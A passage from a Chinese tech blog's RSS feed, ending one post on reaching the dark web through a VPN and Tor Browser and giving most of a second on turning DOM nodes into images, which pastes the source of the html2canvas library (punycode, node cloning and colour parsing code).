<p>1.首先要有VPN，国内的墙厉害，不翻墙是进不去暗网的，我这边用的一个叫魔法集中营的翻墙软件，20块钱一个月，其实这种翻墙的VPN自己搭建也行，只需要有墙外的服务器资源，比方说阿里云，能够翻墙之后，连接youtube。</p>
<p><img alt="" class="has" src="https://uzshare.com/_p?https://img-blog.csdnimg.cn/2018120120444480.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2NvZGVyX3p5eg==,size_16,color_FFFFFF,t_70"></p>
<p>2.其次要有Tor Browser浏览器，国内称洋葱浏览器，是为了无痕处理，毕竟法外之境，需要无痕处理等，打开Tor Browser</p>
<p style="text-indent:0;"><img alt="" class="has" height="563" src="https://uzshare.com/_p?https://img-blog.csdnimg.cn/20181201204514232.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2NvZGVyX3p5eg==,size_16,color_FFFFFF,t_70" width="896"></p>
<p>点击连接，进入此页面。<img alt="" class="has" height="790" src="https://uzshare.com/_p?https://img-blog.csdnimg.cn/2018120120460047.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2NvZGVyX3p5eg==,size_16,color_FFFFFF,t_70" width="886"></p>
<p>连接成功后和正常浏览器一般使用即可</p>
<p>3.第三步，你需要了解暗网的地址，暗网中的大部分网站都是以onion为后缀名的网站，当然也有些像not Evil的搜索网站，但不太会用，暗网毕竟是法外之地，色情暴力血腥都是赤裸裸的，这边只是介绍一下让人知道，能不进去还是别进了，心向大海，春暖花开。</p>
<p>&nbsp;</p>
<p>完成以上三步就可以进入暗网了</p>
<p>&nbsp;</p>
</p></div>
</div>
]]></content:encoded>
										</item>
		<item>
		<title>dom节点生成图片</title>
		<link>https://uzzz.org/article/1461.html</link>
				<pubDate>Fri, 14 Sep 2018 05:35:11 +0000</pubDate>
		<dc:creator><![CDATA[fandyvon]]></dc:creator>
				<category><![CDATA[技术]]></category>

		<guid isPermaLink="false">http://wp.uzzz.org/article/1461.html</guid>
				<description><![CDATA[1，业务要求将dom节点生成图片，注意点，移动端dom节点不可以使用%，rem等布局。要是用px来布局，并且使用640的设计稿，适配320px的手机屏幕。要在服务器上才可以，我是用node+express搭建的服务器环境。如果有自己的环境可以直接引用下面代码 2依赖的js:html2canvas.js和canvas2image.js,为了省事我引入jq。 1dom绘制成为canvas&#8212;&#8212;&#8212;&#8212;&#8211;html2canvas&#160; /* html2canvas 0.5.0-beta3 &#60;http://html2canvas.hertzen.com&#62; Copyright (c) 2016 Niklas von Hertzen Released under License */ !function(e){if("object"==typeof exports&#38;&#38;"undefined"!=typeof module)module.exports=e();else if("function"==typeof define&#38;&#38;define.amd)define([],e);else{var f;"undefined"!=typeof window?f=window:"undefined"!=typeof global?f=global:"undefined"!=typeof self&#38;&#38;(f=self),f.html2canvas=e()}}(function(){var define,module,exports;return (function e(t,n,r){function s(o,u){if(!n[o]){if(!t[o]){var a=typeof require=="function"&#38;&#38;require;if(!u&#38;&#38;a)return a(o,!0);if(i)return i(o,!0);var f=new Error("Cannot find module '"+o+"'");throw f.code="MODULE_NOT_FOUND",f}var l=n[o]={exports:{}};t[o][0].call(l.exports,function(e){var n=t[o][1][e];return s(n?n:e)},l,l.exports,e,t,n,r)}return n[o].exports}var i=typeof require=="function"&#38;&#38;require;for(var o=0;o&#60;r.length;o++)s(r[o]);return s})({1:[function(_dereq_,module,exports){ (function (global){ /*! http://mths.be/punycode v1.2.4 by @mathias */ ;(function(root) { /** Detect free variables */ var freeExports = typeof exports == 'object' &#38;&#38; exports; var freeModule = typeof module == 'object' &#38;&#38; module &#38;&#38; module.exports == freeExports &#38;&#38; module; var freeGlobal = typeof global == 'object' &#38;&#38; global; if (freeGlobal.global === freeGlobal &#124;&#124; freeGlobal.window === freeGlobal) { root = freeGlobal; } /** * The `punycode` object. * @name punycode * @type Object */ var punycode, /** Highest positive signed 32-bit float value */ maxInt = 2147483647, // aka. 0x7FFFFFFF or 2^31-1 /** Bootstring parameters */ base = 36, tMin = 1, tMax = 26, skew = 38, damp = 700, initialBias = 72, initialN = 128, // 0x80 delimiter = '-', // '\x2D' /** Regular expressions */ regexPunycode = /^xn--/, regexNonASCII =]]></description>
								<content:encoded><![CDATA[<div id="article_content" class="article_content clearfix">
 <link rel="stylesheet" href="https://csdnimg.cn/release/phoenix/template/css/ck_htmledit_views-3019150162.css">
 <link rel="stylesheet" href="https://csdnimg.cn/release/phoenix/template/css/ck_htmledit_views-3019150162.css">
<div class="htmledit_views" id="content_views">
<p>1，业务要求将dom节点生成图片，<span style="color:#7c79e5;"><strong><em><u>注意点，移动端dom节点不可以使用%，rem等布局。要是用px来布局，并且使用640的设计稿，适配320px的手机屏幕。要在服务器上才可以，我是用node+express搭建的服务器环境。如果有自己的环境可以直接引用下面代码</u></em></strong></span></p>
<p>2<span style="color:#3399ea;">依赖的js:html2canvas.js和canvas2image.js,</span>为了省事我引入jq。</p>
<h1>1dom绘制成为canvas&#8212;&#8212;&#8212;&#8212;&#8211;html2canvas&nbsp;</h1>
<pre class="has">
<code>/*
  html2canvas 0.5.0-beta3 &lt;http://html2canvas.hertzen.com&gt;
  Copyright (c) 2016 Niklas von Hertzen

  Released under  License
*/

!function(e){if("object"==typeof exports&amp;&amp;"undefined"!=typeof module)module.exports=e();else if("function"==typeof define&amp;&amp;define.amd)define([],e);else{var f;"undefined"!=typeof window?f=window:"undefined"!=typeof global?f=global:"undefined"!=typeof self&amp;&amp;(f=self),f.html2canvas=e()}}(function(){var define,module,exports;return (function e(t,n,r){function s(o,u){if(!n[o]){if(!t[o]){var a=typeof require=="function"&amp;&amp;require;if(!u&amp;&amp;a)return a(o,!0);if(i)return i(o,!0);var f=new Error("Cannot find module '"+o+"'");throw f.code="MODULE_NOT_FOUND",f}var l=n[o]={exports:{}};t[o][0].call(l.exports,function(e){var n=t[o][1][e];return s(n?n:e)},l,l.exports,e,t,n,r)}return n[o].exports}var i=typeof require=="function"&amp;&amp;require;for(var o=0;o&lt;r.length;o++)s(r[o]);return s})({1:[function(_dereq_,module,exports){
(function (global){
/*! http://mths.be/punycode v1.2.4 by @mathias */
;(function(root) {

  /** Detect free variables */
  var freeExports = typeof exports == 'object' &amp;&amp; exports;
  var freeModule = typeof module == 'object' &amp;&amp; module &amp;&amp;
    module.exports == freeExports &amp;&amp; module;
  var freeGlobal = typeof global == 'object' &amp;&amp; global;
  if (freeGlobal.global === freeGlobal || freeGlobal.window === freeGlobal) {
    root = freeGlobal;
  }

  /**
   * The `punycode` object.
   * @name punycode
   * @type Object
   */
  var punycode,

  /** Highest positive signed 32-bit float value */
  maxInt = 2147483647, // aka. 0x7FFFFFFF or 2^31-1

  /** Bootstring parameters */
  base = 36,
  tMin = 1,
  tMax = 26,
  skew = 38,
  damp = 700,
  initialBias = 72,
  initialN = 128, // 0x80
  delimiter = '-', // '\x2D'

  /** Regular expressions */
  regexPunycode = /^xn--/,
  regexNonASCII = /[^ -~]/, // unprintable ASCII chars + non-ASCII chars
  regexSeparators = /\x2E|\u3002|\uFF0E|\uFF61/g, // RFC 3490 separators

  /** Error messages */
  errors = {
    'overflow': 'Overflow: input needs wider integers to process',
    'not-basic': 'Illegal input &gt;= 0x80 (not a basic code point)',
    'invalid-input': 'Invalid input'
  },

  /** Convenience shortcuts */
  baseMinusTMin = base - tMin,
  floor = Math.floor,
  stringFromCharCode = String.fromCharCode,

  /** Temporary variable */
  key;

  /*--------------------------------------------------------------------------*/

  /**
   * A generic error utility function.
   * @private
   * @param {String} type The error type.
   * @returns {Error} Throws a `RangeError` with the applicable error message.
   */
  function error(type) {
    throw RangeError(errors[type]);
  }

  /**
   * A generic `Array#map` utility function.
   * @private
   * @param {Array} array The array to iterate over.
   * @param {Function} callback The function that gets called for every array
   * item.
   * @returns {Array} A new array of values returned by the callback function.
   */
  function map(array, fn) {
    var length = array.length;
    while (length--) {
      array[length] = fn(array[length]);
    }
    return array;
  }

  /**
   * A simple `Array#map`-like wrapper to work with domain name strings.
   * @private
   * @param {String} domain The domain name.
   * @param {Function} callback The function that gets called for every
   * character.
   * @returns {Array} A new string of characters returned by the callback
   * function.
   */
  function mapDomain(string, fn) {
    return map(string.split(regexSeparators), fn).join('.');
  }

  /**
   * Creates an array containing the numeric code points of each Unicode
   * character in the string. While JavaScript uses UCS-2 internally,
   * this function will convert a pair of surrogate halves (each of which
   * UCS-2 exposes as separate characters) into a single code point,
   * matching UTF-16.
   * @see `punycode.ucs2.encode`
   * @see &lt;http://mathiasbynens.be/notes/javascript-encoding&gt;
   * @memberOf punycode.ucs2
   * @name decode
   * @param {String} string The Unicode input string (UCS-2).
   * @returns {Array} The new array of code points.
   */
  function ucs2decode(string) {
    var output = [],
        counter = 0,
        length = string.length,
        value,
        extra;
    while (counter &lt; length) {
      value = string.charCodeAt(counter++);
      if (value &gt;= 0xD800 &amp;&amp; value &lt;= 0xDBFF &amp;&amp; counter &lt; length) {
        // high surrogate, and there is a next character
        extra = string.charCodeAt(counter++);
        if ((extra &amp; 0xFC00) == 0xDC00) { // low surrogate
          output.push(((value &amp; 0x3FF) &lt;&lt; 10) + (extra &amp; 0x3FF) + 0x10000);
        } else {
          // unmatched surrogate; only append this code unit, in case the next
          // code unit is the high surrogate of a surrogate pair
          output.push(value);
          counter--;
        }
      } else {
        output.push(value);
      }
    }
    return output;
  }

  /**
   * Creates a string based on an array of numeric code points.
   * @see `punycode.ucs2.decode`
   * @memberOf punycode.ucs2
   * @name encode
   * @param {Array} codePoints The array of numeric code points.
   * @returns {String} The new Unicode string (UCS-2).
   */
  function ucs2encode(array) {
    return map(array, function(value) {
      var output = '';
      if (value &gt; 0xFFFF) {
        value -= 0x10000;
        output += stringFromCharCode(value &gt;&gt;&gt; 10 &amp; 0x3FF | 0xD800);
        value = 0xDC00 | value &amp; 0x3FF;
      }
      output += stringFromCharCode(value);
      return output;
    }).join('');
  }

  /**
   * Converts a basic code point into a digit/integer.
   * @see `digitToBasic()`
   * @private
   * @param {Number} codePoint The basic numeric code point value.
   * @returns {Number} The numeric value of a basic code point (for use in
   * representing integers) in the range `0` to `base - 1`, or `base` if
   * the code point does not represent a value.
   */
  function basicToDigit(codePoint) {
    if (codePoint - 48 &lt; 10) {
      return codePoint - 22;
    }
    if (codePoint - 65 &lt; 26) {
      return codePoint - 65;
    }
    if (codePoint - 97 &lt; 26) {
      return codePoint - 97;
    }
    return base;
  }

  /**
   * Converts a digit/integer into a basic code point.
   * @see `basicToDigit()`
   * @private
   * @param {Number} digit The numeric value of a basic code point.
   * @returns {Number} The basic code point whose value (when used for
   * representing integers) is `digit`, which needs to be in the range
   * `0` to `base - 1`. If `flag` is non-zero, the uppercase form is
   * used; else, the lowercase form is used. The behavior is undefined
   * if `flag` is non-zero and `digit` has no uppercase form.
   */
  function digitToBasic(digit, flag) {
    //  0..25 map to ASCII a..z or A..Z
    // 26..35 map to ASCII 0..9
    return digit + 22 + 75 * (digit &lt; 26) - ((flag != 0) &lt;&lt; 5);
  }

  /**
   * Bias adaptation function as per section 3.4 of RFC 3492.
   * http://tools.ietf.org/html/rfc3492#section-3.4
   * @private
   */
  function adapt(delta, numPoints, firstTime) {
    var k = 0;
    delta = firstTime ? floor(delta / damp) : delta &gt;&gt; 1;
    delta += floor(delta / numPoints);
    for (/* no initialization */; delta &gt; baseMinusTMin * tMax &gt;&gt; 1; k += base) {
      delta = floor(delta / baseMinusTMin);
    }
    return floor(k + (baseMinusTMin + 1) * delta / (delta + skew));
  }

  /**
   * Converts a Punycode string of ASCII-only symbols to a string of Unicode
   * symbols.
   * @memberOf punycode
   * @param {String} input The Punycode string of ASCII-only symbols.
   * @returns {String} The resulting string of Unicode symbols.
   */
  function decode(input) {
    // Don't use UCS-2
    var output = [],
        inputLength = input.length,
        out,
        i = 0,
        n = initialN,
        bias = initialBias,
        basic,
        j,
        index,
        oldi,
        w,
        k,
        digit,
        t,
        /** Cached calculation results */
        baseMinusT;

    // Handle the basic code points: let `basic` be the number of input code
    // points before the last delimiter, or `0` if there is none, then copy
    // the first basic code points to the output.

    basic = input.lastIndexOf(delimiter);
    if (basic &lt; 0) {
      basic = 0;
    }

    for (j = 0; j &lt; basic; ++j) {
      // if it's not a basic code point
      if (input.charCodeAt(j) &gt;= 0x80) {
        error('not-basic');
      }
      output.push(input.charCodeAt(j));
    }

    // Main decoding loop: start just after the last delimiter if any basic code
    // points were copied; start at the beginning otherwise.

    for (index = basic &gt; 0 ? basic + 1 : 0; index &lt; inputLength; /* no final expression */) {

      // `index` is the index of the next character to be consumed.
      // Decode a generalized variable-length integer into `delta`,
      // which gets added to `i`. The overflow checking is easier
      // if we increase `i` as we go, then subtract off its starting
      // value at the end to obtain `delta`.
      for (oldi = i, w = 1, k = base; /* no condition */; k += base) {

        if (index &gt;= inputLength) {
          error('invalid-input');
        }

        digit = basicToDigit(input.charCodeAt(index++));

        if (digit &gt;= base || digit &gt; floor((maxInt - i) / w)) {
          error('overflow');
        }

        i += digit * w;
        t = k &lt;= bias ? tMin : (k &gt;= bias + tMax ? tMax : k - bias);

        if (digit &lt; t) {
          break;
        }

        baseMinusT = base - t;
        if (w &gt; floor(maxInt / baseMinusT)) {
          error('overflow');
        }

        w *= baseMinusT;

      }

      out = output.length + 1;
      bias = adapt(i - oldi, out, oldi == 0);

      // `i` was supposed to wrap around from `out` to `0`,
      // incrementing `n` each time, so we'll fix that now:
      if (floor(i / out) &gt; maxInt - n) {
        error('overflow');
      }

      n += floor(i / out);
      i %= out;

      // Insert `n` at position `i` of the output
      output.splice(i++, 0, n);

    }

    return ucs2encode(output);
  }

  /**
   * Converts a string of Unicode symbols to a Punycode string of ASCII-only
   * symbols.
   * @memberOf punycode
   * @param {String} input The string of Unicode symbols.
   * @returns {String} The resulting Punycode string of ASCII-only symbols.
   */
  function encode(input) {
    var n,
        delta,
        handledCPCount,
        basicLength,
        bias,
        j,
        m,
        q,
        k,
        t,
        currentValue,
        output = [],
        /** `inputLength` will hold the number of code points in `input`. */
        inputLength,
        /** Cached calculation results */
        handledCPCountPlusOne,
        baseMinusT,
        qMinusT;

    // Convert the input in UCS-2 to Unicode
    input = ucs2decode(input);

    // Cache the length
    inputLength = input.length;

    // Initialize the state
    n = initialN;
    delta = 0;
    bias = initialBias;

    // Handle the basic code points
    for (j = 0; j &lt; inputLength; ++j) {
      currentValue = input[j];
      if (currentValue &lt; 0x80) {
        output.push(stringFromCharCode(currentValue));
      }
    }

    handledCPCount = basicLength = output.length;

    // `handledCPCount` is the number of code points that have been handled;
    // `basicLength` is the number of basic code points.

    // Finish the basic string - if it is not empty - with a delimiter
    if (basicLength) {
      output.push(delimiter);
    }

    // Main encoding loop:
    while (handledCPCount &lt; inputLength) {

      // All non-basic code points &lt; n have been handled already. Find the next
      // larger one:
      for (m = maxInt, j = 0; j &lt; inputLength; ++j) {
        currentValue = input[j];
        if (currentValue &gt;= n &amp;&amp; currentValue &lt; m) {
          m = currentValue;
        }
      }

      // Increase `delta` enough to advance the decoder's &lt;n,i&gt; state to &lt;m,0&gt;,
      // but guard against overflow
      handledCPCountPlusOne = handledCPCount + 1;
      if (m - n &gt; floor((maxInt - delta) / handledCPCountPlusOne)) {
        error('overflow');
      }

      delta += (m - n) * handledCPCountPlusOne;
      n = m;

      for (j = 0; j &lt; inputLength; ++j) {
        currentValue = input[j];

        if (currentValue &lt; n &amp;&amp; ++delta &gt; maxInt) {
          error('overflow');
        }

        if (currentValue == n) {
          // Represent delta as a generalized variable-length integer
          for (q = delta, k = base; /* no condition */; k += base) {
            t = k &lt;= bias ? tMin : (k &gt;= bias + tMax ? tMax : k - bias);
            if (q &lt; t) {
              break;
            }
            qMinusT = q - t;
            baseMinusT = base - t;
            output.push(
              stringFromCharCode(digitToBasic(t + qMinusT % baseMinusT, 0))
            );
            q = floor(qMinusT / baseMinusT);
          }

          output.push(stringFromCharCode(digitToBasic(q, 0)));
          bias = adapt(delta, handledCPCountPlusOne, handledCPCount == basicLength);
          delta = 0;
          ++handledCPCount;
        }
      }

      ++delta;
      ++n;

    }
    return output.join('');
  }

  /**
   * Converts a Punycode string representing a domain name to Unicode. Only the
   * Punycoded parts of the domain name will be converted, i.e. it doesn't
   * matter if you call it on a string that has already been converted to
   * Unicode.
   * @memberOf punycode
   * @param {String} domain The Punycode domain name to convert to Unicode.
   * @returns {String} The Unicode representation of the given Punycode
   * string.
   */
  function toUnicode(domain) {
    return mapDomain(domain, function(string) {
      return regexPunycode.test(string)
        ? decode(string.slice(4).toLowerCase())
        : string;
    });
  }

  /**
   * Converts a Unicode string representing a domain name to Punycode. Only the
   * non-ASCII parts of the domain name will be converted, i.e. it doesn't
   * matter if you call it with a domain that's already in ASCII.
   * @memberOf punycode
   * @param {String} domain The domain name to convert, as a Unicode string.
   * @returns {String} The Punycode representation of the given domain name.
   */
  function toASCII(domain) {
    return mapDomain(domain, function(string) {
      return regexNonASCII.test(string)
        ? 'xn--' + encode(string)
        : string;
    });
  }

  /*--------------------------------------------------------------------------*/

  /** Define the public API */
  punycode = {
    /**
     * A string representing the current Punycode.js version number.
     * @memberOf punycode
     * @type String
     */
    'version': '1.2.4',
    /**
     * An object of methods to convert from JavaScript's internal character
     * representation (UCS-2) to Unicode code points, and back.
     * @see &lt;http://mathiasbynens.be/notes/javascript-encoding&gt;
     * @memberOf punycode
     * @type Object
     */
    'ucs2': {
      'decode': ucs2decode,
      'encode': ucs2encode
    },
    'decode': decode,
    'encode': encode,
    'toASCII': toASCII,
    'toUnicode': toUnicode
  };

  /** Expose `punycode` */
  // Some AMD build optimizers, like r.js, check for specific condition patterns
  // like the following:
  if (
    typeof define == 'function' &amp;&amp;
    typeof define.amd == 'object' &amp;&amp;
    define.amd
  ) {
    define('punycode', function() {
      return punycode;
    });
  } else if (freeExports &amp;&amp; !freeExports.nodeType) {
    if (freeModule) { // in Node.js or RingoJS v0.8.0+
      freeModule.exports = punycode;
    } else { // in Narwhal or RingoJS v0.7.0-
      for (key in punycode) {
        punycode.hasOwnProperty(key) &amp;&amp; (freeExports[key] = punycode[key]);
      }
    }
  } else { // in Rhino or a web browser
    root.punycode = punycode;
  }

}(this));

}).call(this,typeof global !== "undefined" ? global : typeof self !== "undefined" ? self : typeof window !== "undefined" ? window : {})
},{}],2:[function(_dereq_,module,exports){
var log = _dereq_('./log');

function restoreOwnerScroll(ownerDocument, x, y) {
    if (ownerDocument.defaultView &amp;&amp; (x !== ownerDocument.defaultView.pageXOffset || y !== ownerDocument.defaultView.pageYOffset)) {
        ownerDocument.defaultView.scrollTo(x, y);
    }
}

function cloneCanvasContents(canvas, clonedCanvas) {
    try {
        if (clonedCanvas) {
            clonedCanvas.width = canvas.width;
            clonedCanvas.height = canvas.height;
            clonedCanvas.getContext("2d").putImageData(canvas.getContext("2d").getImageData(0, 0, canvas.width, canvas.height), 0, 0);
        }
    } catch(e) {
        log("Unable to copy canvas content from", canvas, e);
    }
}

function cloneNode(node, javascriptEnabled) {
    var clone = node.nodeType === 3 ? document.createTextNode(node.nodeValue) : node.cloneNode(false);

    var child = node.firstChild;
    while(child) {
        if (javascriptEnabled === true || child.nodeType !== 1 || child.nodeName !== 'SCRIPT') {
            clone.appendChild(cloneNode(child, javascriptEnabled));
        }
        child = child.nextSibling;
    }

    if (node.nodeType === 1) {
        clone._scrollTop = node.scrollTop;
        clone._scrollLeft = node.scrollLeft;
        if (node.nodeName === "CANVAS") {
            cloneCanvasContents(node, clone);
        } else if (node.nodeName === "TEXTAREA" || node.nodeName === "SELECT") {
            clone.value = node.value;
        }
    }

    return clone;
}

function initNode(node) {
    if (node.nodeType === 1) {
        node.scrollTop = node._scrollTop;
        node.scrollLeft = node._scrollLeft;

        var child = node.firstChild;
        while(child) {
            initNode(child);
            child = child.nextSibling;
        }
    }
}

module.exports = function(ownerDocument, containerDocument, width, height, options, x ,y) {
    var documentElement = cloneNode(ownerDocument.documentElement, options.javascriptEnabled);
    var container = containerDocument.createElement("iframe");

    container.className = "html2canvas-container";
    container.style.visibility = "hidden";
    container.style.position = "fixed";
    container.style.left = "-10000px";
    container.style.top = "0px";
    container.style.border = "0";
    container.width = width;
    container.height = height;
    container.scrolling = "no"; // ios won't scroll without it
    containerDocument.body.appendChild(container);

    return new Promise(function(resolve) {
        var documentClone = container.contentWindow.document;

        /* Chrome doesn't detect relative background-images assigned in inline &lt;style&gt; sheets when fetched through getComputedStyle
         if window url is about:blank, we can assign the url to current by writing onto the document
         */
        container.contentWindow.onload = container.onload = function() {
            var interval = setInterval(function() {
                if (documentClone.body.childNodes.length &gt; 0) {
                    initNode(documentClone.documentElement);
                    clearInterval(interval);
                    if (options.type === "view") {
                        container.contentWindow.scrollTo(x, y);
                        if ((/(iPad|iPhone|iPod)/g).test(navigator.userAgent) &amp;&amp; (container.contentWindow.scrollY !== y || container.contentWindow.scrollX !== x)) {
                            documentClone.documentElement.style.top = (-y) + "px";
                            documentClone.documentElement.style.left = (-x) + "px";
                            documentClone.documentElement.style.position = 'absolute';
                        }
                    }
                    resolve(container);
                }
            }, 50);
        };

        documentClone.open();
        documentClone.write("&lt;!DOCTYPE html&gt;&lt;html&gt;&lt;/html&gt;");
        // Chrome scrolls the parent document for some reason after the write to the cloned window???
        restoreOwnerScroll(ownerDocument, x, y);
        documentClone.replaceChild(documentClone.adoptNode(documentElement), documentClone.documentElement);
        documentClone.close();
    });
};

},{"./log":13}],3:[function(_dereq_,module,exports){
// http://dev.w3.org/csswg/css-color/

function Color(value) {
    this.r = 0;
    this.g = 0;
    this.b = 0;
    this.a = null;
    var result = this.fromArray(value) ||
        this.namedColor(value) ||
        this.rgb(value) ||
        this.rgba(value) ||
        this.hex6(value) ||
        this.hex3(value);
}

Color.prototype.darken = function(amount) {
    var a = 1 - amount;
    return  new Color([
        Math.round(this.r * a),
        Math.round(this.g * a),
        Math.round(this.b * a),
        this.a
    ]);
};

Color.prototype.isTransparent = function() {
    return this.a === 0;
};

Color.prototype.isBlack = function() {
    return this.r === 0 &amp;&amp; this.g === 0 &amp;&amp; this.b === 0;
};

Color.prototype.fromArray = function(array) {
    if (Array.isArray(array)) {
        this.r = Math.min(array[0], 255);
        this.g = Math.min(array[1], 255);
        this.b = Math.min(array[2], 255);
        if (array.length &gt; 3) {
            this.a = array[3];
        }
    }

    return (Array.isArray(array));
};

var _hex3 = /^#([a-f0-9]{3})$/i;

Color.prototype.hex3 = function(value) {
    var match = null;
    if ((match = value.match(_hex3)) !== null) {
        this.r = parseInt(match[1][0] + match[1][0], 16);
        this.g = parseInt(match[1][1] + match[1][1], 16);
        this.b = parseInt(match[1][2] + match[1][2], 16);
    }
    return match !== null;
};

var _hex6 = /^#([a-f0-9]{6})$/i;

Color.prototype.hex6 = function(value) {
    var match = null;
    if ((match = value.match(_hex6)) !== null) {
        this.r = parseInt(match[1].substring(0, 2), 16);
        this.g = parseInt(match[1].substring(2, 4), 16);
        this.b = parseInt(match[1].substring(4, 6), 16);
    }
    return match !== null;
};


var _rgb = /^rgb\(\s*(\d{1,3})\s*,\s*(\d{1,3})\s*,\s*(\d{1,3})\s*\)$/;

Color.prototype.rgb = function(value) {
    var match = null;
    if ((match = value.match(_rgb)) !== null) {
        this.r = Number(match[1]);
        this.g = Number(match[2]);
        this.b = Number(match[3]);
    }
    return match !== null;
};

var _rgba = /^rgba\(\s*(\d{1,3})\s*,\s*(\d{1,3})\s*,\s*(\d{1,3})\s*,\s*(\d?\.?\d+)\s*\)$/;

Color.prototype.rgba = function(value) {
    var match = null;
    if ((match = value.match(_rgba)) !== null) {
        this.r = Number(match[1]);
        this.g = Number(match[2]);
        this.b = Number(match[3]);
        this.a = Number(match[4]);
    }
    return match !== null;
};

Color.prototype.toString = function() {
    return this.a !== null &amp;&amp; this.a !== 1 ?
    "rgba(" + [this.r, this.g, this.b, this.a].join(",") + ")" :
    "rgb(" + [this.r, this.g, this.b].join(",") + ")";
};

Color.prototype.namedColor = function(value) {
    value = value.toLowerCase();
    var color = colors[value];
    if (color) {
        this.r = color[0];
        this.g = color[1];
        this.b = color[2];
    } else if (value === "transparent") {
        this.r = this.g = this.b = this.a = 0;
        return true;
    }

    return !!color;
};

Color.prototype.isColor = true;

// JSON.stringify([].slice.call($$('.named-color-table tr'), 1).map(function(row) { return [row.childNodes[3].textContent, row.childNodes[5].textContent.trim().split(",").map(Number)] }).reduce(function(data, row) {data[row[0]] = row[1]; return data}, {}))
var colors = {
    "aliceblue": [240, 248, 255],
    "antiquewhite": [250, 235, 215],
    "aqua": [0, 255, 255],
    "aquamarine": [127, 255, 212],
    "azure": [240, 255, 255],
    "beige": [245, 245, 220],
    "bisque": [255, 228, 196],
    "black": [0, 0, 0],
    "blanchedalmond": [255, 235, 205],
    "blue": [0, 0, 255],
    "blueviolet": [138, 43, 226],
    "brown": [165, 42, 42],
    "burlywood": [222, 184, 135],
    "cadetblue": [95, 158, 160],
    "chartreuse": [127, 255, 0],
    "chocolate": [210, 105, 30],
    "coral": [255, 127, 80],
    "cornflowerblue": [100, 149, 237],
    "cornsilk": [255, 248, 220],
    "crimson": [220, 20, 60],
    "cyan": [0, 255, 255],
    "darkblue": [0, 0, 139],
    "darkcyan": [0, 139, 139],
    "darkgoldenrod": [184, 134, 11],
    "darkgray": [169, 169, 169],
    "darkgreen": [0, 100, 0],
    "darkgrey": [169, 169, 169],
    "darkkhaki": [189, 183, 107],
    "darkmagenta": [139, 0, 139],
    "darkolivegreen": [85, 107, 47],
    "darkorange": [255, 140, 0],
    "darkorchid": [153, 50, 204],
    "darkred": [139, 0, 0],
    "darksalmon": [233, 150, 122],
    "darkseagreen": [143, 188, 143],
    "darkslateblue": [72, 61, 139],
    "darkslategray": [47, 79, 79],
    "darkslategrey": [47, 79, 79],
    "darkturquoise": [0, 206, 209],
    "darkviolet": [148, 0, 211],
    "deeppink": [255, 20, 147],
    "deepskyblue": [0, 191, 255],
    "dimgray": [105, 105, 105],
    "dimgrey": [105, 105, 105],
    "dodgerblue": [30, 144, 255],
    "firebrick": [178, 34, 34],
    "floralwhite": [255, 250, 240],
    "forestgreen": [34, 139, 34],
    "fuchsia": [255, 0, 255],
    "gainsboro": [220, 220, 220],
    "ghostwhite": [248, 248, 255],
    "gold": [255, 215, 0],
    "goldenrod": [218, 165, 32],
    "gray": [128, 128, 128],
    "green": [0, 128, 0],
    "greenyellow": [173, 255, 47],
    "grey": [128, 128, 128],
    "honeydew": [240, 255, 240],
    "hotpink": [255, 105, 180],
    "indianred": [205, 92, 92],
    "indigo": [75, 0, 130],
    "ivory": [255, 255, 240],
    "khaki": [240, 230, 140],
    "lavender": [230, 230, 250],
    "lavenderblush": [255, 240, 245],
    "lawngreen": [124, 252, 0],
    "lemonchiffon": [255, 250, 205],
    "lightblue": [173, 216, 230],
    "lightcoral": [240, 128, 128],
    "lightcyan": [224, 255, 255],
    "lightgoldenrodyellow": [250, 250, 210],
    "lightgray": [211, 211, 211],
    "lightgreen": [144, 238, 144],
    "lightgrey": [211, 211, 211],
    "lightpink": [255, 182, 193],
    "lightsalmon": [255, 160, 122],
    "lightseagreen": [32, 178, 170],
    "lightskyblue": [135, 206, 250],
    "lightslategray": [119, 136, 153],
    "lightslategrey": [119, 136, 153],
    "lightsteelblue": [176, 196, 222],
    "lightyellow": [255, 255, 224],
    "lime": [0, 255, 0],
    "limegreen": [50, 205, 50],
    "linen": [250, 240, 230],
    "magenta": [255, 0, 255],
    "maroon": [128, 0, 0],
    "mediumaquamarine": [102, 205, 170],
    "mediumblue": [0, 0, 205],
    "mediumorchid": [186, 85, 211],
    "mediumpurple": [147, 112, 219],
    "mediumseagreen": [60, 179, 113],
    "mediumslateblue": [123, 104, 238],
    "mediumspringgreen": [0, 250, 154],
    "mediumturquoise": [72, 209, 204],
    "mediumvioletred": [199, 21, 133],
    "midnightblue": [25, 25, 112],
    "mintcream": [245, 255, 250],
    "mistyrose": [255, 228, 225],
    "moccasin": [255, 228, 181],
    "navajowhite": [255, 222, 173],
    "navy": [0, 0, 128],
    "oldlace": [253, 245, 230],
    "olive": [128, 128, 0],
    "olivedrab": [107, 142, 35],
    "orange": [255, 165, 0],
    "orangered": [255, 69, 0],
    "orchid": [218, 112, 214],
    "palegoldenrod": [238, 232, 170],
    "palegreen": [152, 251, 152],
    "paleturquoise": [175, 238, 238],
    "palevioletred": [219, 112, 147],
    "papayawhip": [255, 239, 213],
    "peachpuff": [255, 218, 185],
    "peru": [205, 133, 63],
    "pink": [255, 192, 203],
    "plum": [221, 160, 221],
    "powderblue": [176, 224, 230],
    "purple": [128, 0, 128],
    "rebeccapurple": [102, 51, 153],
    "red": [255, 0, 0],
    "rosybrown": [188, 143, 143],
    "royalblue": [65, 105, 225],
    "saddlebrown": [139, 69, 19],
    "salmon": [250, 128, 114],
    "sandybrown": [244, 164, 96],
    "seagreen": [46, 139, 87],
    "seashell": [255, 245, 238],
    "sienna": [160, 82, 45],
    "silver": [192, 192, 192],
    "skyblue": [135, 206, 235],
    "slateblue": [106, 90, 205],
    "slategray": [112, 128, 144],
    "slategrey": [112, 128, 144],
    "snow": [255, 250, 250],
    "springgreen": [0, 255, 127],
    "steelblue": [70, 130, 180],
    "tan": [210, 180, 140],
    "teal": [0, 128, 128],
    "thistle": [216, 191, 216],
    "tomato": [255, 99, 71],
    "turquoise": [64, 224, 208],
    "violet": [238, 130, 238],
    "wheat": [245, 222, 179],
    "white": [255, 255, 255],
    "whitesmoke": [245, 245, 245],
    "yellow": [255, 255, 0],
    "yellowgreen": [154, 205, 50]
};

